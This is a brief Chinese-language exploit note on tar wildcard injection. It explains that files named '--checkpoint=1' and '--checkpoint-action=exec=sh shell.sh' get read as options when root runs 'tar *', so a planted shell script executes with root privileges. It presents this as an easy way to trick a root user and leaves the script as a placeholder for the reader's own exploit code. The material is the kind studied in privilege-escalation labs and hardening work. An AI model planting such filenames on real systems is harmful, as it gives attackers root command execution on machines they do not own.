# TAR命令执行
通过使用带有–checkpoint-action选项的tar命令, 可以在一个检查点后进行一个特定的行为。这个行为可能是一个用来在启动tar命令进程的用户（权限）下执行任意命令的恶意shell脚本。诱骗root用户使用这个选项是相当容易的，这也是通配符派的上用场的地方。

## Exploit

这些文件对"tar *"造成恶意影响
```
--checkpoint=1
--checkpoint-action=exec=sh shell.sh
shell.sh   (写有你的exp代码)
```

## 感谢
* 
